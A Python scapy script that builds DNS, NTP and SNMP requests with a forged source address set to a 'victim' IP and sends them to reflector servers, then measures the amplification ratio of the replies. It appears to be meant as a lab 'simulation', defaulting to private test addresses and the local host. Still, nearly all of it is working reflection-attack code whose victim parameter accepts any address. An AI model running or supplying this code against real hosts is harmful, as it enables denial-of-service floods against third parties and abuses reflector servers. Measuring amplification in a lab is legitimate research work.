import scapy.all as scapy
import random
import time

SERVICE_PORTS = {
    "DNS": 53,
    "NTP": 123,
    "SNMP": 161
}

def build_packet(service, reflector_ip, victim_ip, port):
    if service == "DNS":
        # DNS query with RD=1, type=A (example.com)
        pkt = scapy.IP(dst=reflector_ip, src=victim_ip) / \
              scapy.UDP(dport=port, sport=random.randint(1024, 65535)) / \
              scapy.DNS(rd=1, qd=scapy.DNSQR(qname="example.com", qtype="A"))
    elif service == "NTP":
        # NTP Mode 3 request (client)
        pkt = scapy.IP(dst=reflector_ip, src=victim_ip) / \
              scapy.UDP(dport=port, sport=random.randint(1024, 65535)) / \
              scapy.Raw(load=b'\x1b' + 47 * b'\0')
    elif service == "SNMP":
        # SNMP GetRequest for sysDescr OID
        snmp_payload = (
            b"\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x19\x02\x04\x70\x69\x6e\x67\x02"
            b"\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00"
        )
        pkt = scapy.IP(dst=reflector_ip, src=victim_ip) / \
              scapy.UDP(dport=port, sport=random.randint(1024, 65535)) / \
              scapy.Raw(load=snmp_payload)
    else:
        raise ValueError(f"Unsupported service: {service}")
    return pkt

def amp_attack(reflector, victim=None, service="DNS", port=None, timeout=5):
    """
    Perform an amplification attack simulation.

    Parameters:
    - reflector: IP of reflector server
    - victim: IP of victim; if None, responses come back to us
    - service: one of 'DNS', 'NTP', 'SNMP'
    - port: override default port (optional)
    - timeout: how long to wait for response packets (seconds)
    """
    service = service.upper()
    if port is None:
        port = SERVICE_PORTS.get(service)
    if victim is None:
        # Use local IP (where response will be captured)
        victim = scapy.conf.iface.ip

    # Build packet to send
    pkt = build_packet(service, reflector, victim, port)
    sent_size = len(bytes(pkt))
    print(f"[+] Sending {service} packet ({sent_size} bytes) to {reflector} from {victim}")

    # Send packet (no response yet)
    scapy.send(pkt, verbose=False)

    # Capture response packets destined to this machine from reflector
    # Filter by UDP and source IP = reflector and destination port random source port used
    # We get the sport used from pkt[UDP].sport to filter response port
    sport = pkt[scapy.UDP].sport
    capture_filter = f"udp and src host {reflector} and dst port {sport}"

    print(f"[+] Listening for response packets with filter: {capture_filter} for {timeout}s...")
    packets = scapy.sniff(filter=capture_filter, timeout=timeout)

    if not packets:
        print("[-] No response received.")
        return service, sent_size, 0, 0, None  # No amplification

    # Take the first response packet for measurement and display
    resp_pkt = packets[0]
    recv_size = len(bytes(resp_pkt))
    amplification_ratio = recv_size / sent_size if sent_size > 0 else 0

    print(f"[+] Received response of {recv_size} bytes")
    print(f"[=] Amplification Ratio: {amplification_ratio:.2f}")
    print("[*] Sample response packet:")
    resp_pkt.show()

    return service, sent_size, recv_size, amplification_ratio, resp_pkt

# Example usage:

if __name__ == "__main__":
    # Replace these with your test IPs
    reflector_ips = {
        "DNS": "192.168.56.2",
        "NTP": "192.168.56.3",
        "SNMP": "192.168.56.4"
    }
    results = []
    for svc, ip in reflector_ips.items():
        res = amp_attack(reflector=ip, victim=None, service=svc)
        results.append(res)

    print("\n--- Amplification Results Table ---")
    print(f"{'Service':<8} | {'Sent':<5} | {'Received':<8} | {'Ratio':<6}")
    print("-" * 40)
    for service, sent, received, ratio, _ in results:
        print(f"{service:<8} | {sent:<5} | {received:<8} | {ratio:<.2f}")
